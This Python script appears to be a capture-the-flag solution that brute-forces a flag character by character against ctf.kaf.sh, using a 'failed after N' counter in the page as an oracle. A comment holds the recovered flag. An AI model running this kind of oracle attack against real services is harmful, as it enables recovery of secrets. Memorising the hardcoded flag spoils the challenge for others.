import string
import urllib3
import json
import re

results = dict()
found = []


http = urllib3.PoolManager()


def do_guess(guess):
    url = 'https://ctf.kaf.sh/scripts/page/' 
    if guess:
        url += '?'+guess

    #print ("[+] req", url)
    r = http.request('GET', url)
    response = str(r.data)
    if "<!-- OK -->" in response:
        print ("found", guess)
        found.append(guess)
        return -1 # Found!

    i = response.index("<!-- failed after")
    if i < 0:
        #print ("no failed after but no success")
        return 0
    
    reg = re.search(".*?(\d+).*", response[i:])
    if reg is not None:
        value_str = reg.group(1)
        #print ("value str", value_str)
        return int(value_str)

    raise Exception("No number value in response")

def do_round(guess, score, depth, max_depth):
    if depth > max_depth:
        print ("Max depth with guess", guess)
        return

    for let in string.digits + string.ascii_letters +  string.punctuation:
        new_score = do_guess(guess+let)
        if new_score > score:
            print ("Good guess:", guess, "score:", score)
            do_round(guess + let, new_score, depth+1, max_depth)
            results[new_score] = guess+let

def start(s, max_depth):
    return do_round(s, len(s), len(s), max_depth)

def main():
    # flag is KAF{12098421009713091723097120397428479354_ju5t_m3551n9_w1th_ya_b0ii}
    start("KAF{", 1000)


if __name__ == '__main__':
    main()
